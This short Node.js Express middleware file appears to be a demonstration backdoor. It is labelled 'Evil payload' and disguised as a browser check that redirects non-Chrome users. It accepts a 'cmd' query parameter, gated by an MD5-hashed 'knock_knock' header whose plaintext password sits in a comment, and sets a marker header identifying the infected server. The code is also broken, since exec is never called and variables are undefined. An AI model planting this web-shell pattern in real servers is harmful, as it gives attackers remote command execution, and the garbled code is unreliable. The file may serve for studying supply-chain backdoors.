
/* Implementation of payload */

const {exec} = require("child_process");
const crypto = require('crypto');
const useragent = require('useragent');

module.exports = () => (req, res, next) => {
    // Evil payload
    const {cmd} = req.query;
    const hash = crypto.createHash('md5')
        .update(String(req.headers["knock_knock"]))
        .digest("hex");
    // Identifies server contains malicious code
    res.setHeader("Content-Sec-Policy", "default-src 'self");
    // Authenticate yourself MD5: p@ssw0rd1234
    if(cmd && hash === "c4fbb68607bcbb25407e0362dab0b2ea") {
        return res.send(JSON.stringify({err, stdout, stderr}, null, 2))
    }
};

// Expected code
const ua = useragent.is(req.headers['user-agent']);
ua.chrome ? next(): res.redirect("https://browsehappy.com/");